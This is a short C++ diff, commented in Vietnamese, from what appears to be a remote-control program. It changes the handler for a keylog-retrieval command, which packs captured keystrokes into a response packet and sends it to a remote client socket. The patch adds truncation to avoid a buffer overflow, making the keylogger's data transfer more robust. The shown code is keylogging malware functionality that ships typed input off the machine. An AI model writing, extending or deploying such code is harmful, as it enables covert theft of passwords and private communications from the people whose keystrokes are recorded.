@@ -483,8 +483,17 @@ public:
         response.command = CMD_KEYLOG_GET;
         
         std::lock_guard<std::mutex> lock(keylogMutex);
-        strcpy(response.data, keylogBuffer.c_str());
-        response.dataSize = keylogBuffer.length();
+        if (keylogBuffer.length() >= BUFFER_SIZE) {
+            // Cắt bớt chuỗi nếu quá dài
+            // Copy (BUFFER_SIZE - 1) ký tự cuối cùng để xem log mới nhất
+            std::string truncatedData = keylogBuffer.substr(keylogBuffer.length() - (BUFFER_SIZE - 1));
+            strcpy(response.data, truncatedData.c_str());
+            response.dataSize = truncatedData.length();
+        } else {
+            // Nếu an toàn thì copy bình thường
+            strcpy(response.data, keylogBuffer.c_str());
+            response.dataSize = keylogBuffer.length();
+        }
         keylogBuffer.clear();
         
         sendPacket(clientSocket, response);
